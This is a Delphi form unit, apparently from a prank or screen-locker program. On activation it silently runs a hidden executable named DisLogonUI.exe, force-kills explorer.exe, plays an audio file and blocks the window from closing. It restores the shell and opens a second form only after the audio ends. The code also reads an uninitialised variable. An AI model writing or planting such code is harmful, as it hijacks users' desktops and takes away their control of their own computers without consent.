unit Starting;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Registry, ShellAPI, Vcl.MPlayer,
  Vcl.ExtCtrls, Vcl.StdCtrls, Vcl.Imaging.jpeg;

type
  TForm1 = class(TForm)
  var
    MediaPlayer1: TMediaPlayer;
    Image1: TImage;
    Timer1: TTimer;
    procedure FormActivate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

uses Main;

{$R *.dfm}

procedure TForm1.FormActivate(Sender: TObject);
var
oneactivate: integer;
begin
if oneactivate = 1
then
else
begin
ShellExecute(Handle, 'open',
'c:\windows\DisLogonUI.exe', nil, nil,
SW_HIDE);
ShellExecute(Handle, 'open','c:\windows\system32\cmd.exe', '/c taskkill /f /im explorer.exe', nil,SW_HIDE);
MediaPlayer1.FileName:='C:\a.mp3';
MediaPlayer1.Open;
MediaPlayer1.Play;
Timer1.Enabled := true;
oneactivate:= 1;
end;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
CanClose := False;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
   if Mediaplayer1.Mode = mpstopped
   then
  begin
    Timer1.Enabled := false;
    ShellExecute(Handle, 'open','c:\windows\explorer.exe',nil, nil,SW_HIDE);
    Form1.Hide;
    Form2.Show;
  end;
end;

end.
